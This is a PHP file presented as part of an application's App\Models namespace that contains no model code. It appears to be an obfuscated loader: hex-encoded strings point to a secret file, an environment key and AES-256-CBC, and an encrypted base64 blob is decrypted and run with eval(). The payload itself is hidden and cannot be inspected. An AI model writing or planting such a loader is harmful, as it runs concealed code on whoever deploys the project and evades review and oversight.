<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hhARP49shypA5HhUIla76w==');

$c=base64_decode(

'1HNRHu9fZC5tfTdXiY3mKjwdvzfZdFRRrCQNjH9VbHY1DnznqTwN/cyQLwwGy4w4U+HYl58wtIvf' .
'/+2W/0WDRpzHpK5VDon/tcyCtY5kKcUItByFhbDv/FMYiNOhkejlD6tzMTEcs81FZwH5n29Pv/C4' .
'Sihfds6V5WFQNQAg0P02JlqUrVmY2pAyMILY6eX7KeA3VAa9g982DKjVTOV2g/cBLkiWSwCItPl6' .
'LJRLGMkJoie5hrCc0BVRJlz282tGUpSJRLAay0EjBQs9JRLqwVLKKcRYWentSafASm5svb53mzkn' .
'S49RWJiTZ06uyY8kt53zxeSA0YzAKi7jdtKitv+P9k0G/tCToWgCN+fGuqRpJFTqwD4fEv2As88k' .
'XVd+7SEDJRhZfgtqzV+3k+WnzaNnnkdZHxv4iahT9CeO33Utatr7m421dzsq3XVK0s5xCcFlcmcG' .
'sGlsa0c35xAQZv3nKufPZNrKmLLxgtLr/ivhvGABBP+MlcX+P1CP3S6OQpK78yNBm84hzpimBUrp' .
'0+nKy6GX3liIoohzCA9pcbx1VKLtqH2BVcHJMyrI6dTgLZts4iz+rxezqiEp7rKbfVDmJ+cunXyA' .
'8vUdXck8Gu82ysx3Ou9yhwQv+wBY2IRWV/sVppR/GLbNzmVN7vNinqeozHTExqOTEdrDtRFmVsg6' .
'QJq7HrWX4LyqQNvMVnpw1RFQKzvTGZ1BfC8kcBfDcZrcOWLIkeXyb3yoK2qM14ENVNQU8yiHw2aO' .
'4Bl2JfFvuySONSFHRj9aK+TonHIwR6MmZnvfDBN4tr6PiceH84ZYFUR0o4vjfU0VIBWv9QicL2Ei' .
'H2zxO2m5t1KlvLHNRUyEFTpHfFUoheNnsn7WNL8Mfxm/rCSaBV/bCgtdkkG6SF2kzLbXvYNKspDS' .
'2blcdg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

